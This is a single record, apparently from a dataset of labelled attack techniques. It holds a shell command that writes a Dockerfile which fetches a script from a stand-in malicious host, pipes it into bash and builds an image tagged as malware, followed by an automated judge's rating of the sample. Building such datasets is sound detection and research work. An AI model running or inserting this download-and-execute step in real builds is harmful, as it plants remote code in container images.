command:
echo 'FROM ubuntu
RUN wget -O- http://malicious-source.com/install.sh | bash' > Dockerfile.malicious && podman build -f Dockerfile.malicious -t embedded_malware .
explanation: Creates a Dockerfile with a RUN command that downloads and executes a malicious script and then builds an image using that Dockerfile.
rationale_steps: Execute an external script within the build process to embed malware in the image.

llm_judgments.reason: The technique perfectly fits the category of building a container image on a host as described, is highly plausible technically, and carries real attack likelihood and high maliciousness; lower relevance of privilege since the command does not specifically require elevated privileges.

The sample perfectly demonstrates the technique of building a malicious container image on host using standard container build commands and a common attack pattern of downloading remote malicious content.
